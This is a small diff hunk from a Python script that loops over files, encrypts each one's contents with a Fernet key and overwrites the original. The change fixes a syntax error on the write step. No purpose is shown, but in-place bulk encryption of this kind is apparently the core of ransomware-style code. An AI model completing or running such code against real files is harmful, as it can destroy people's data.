@@ -27,5 +27,5 @@ for file in files:
         # encrypt the contents using the generated key
         contents_encrypted = Fernet(key).encrypt(contents)
         # open the file in binary write mode
-        with open(file, "wb") as thefile
+        with open(file, "wb") as thefile:
             # write the encrypted contents back
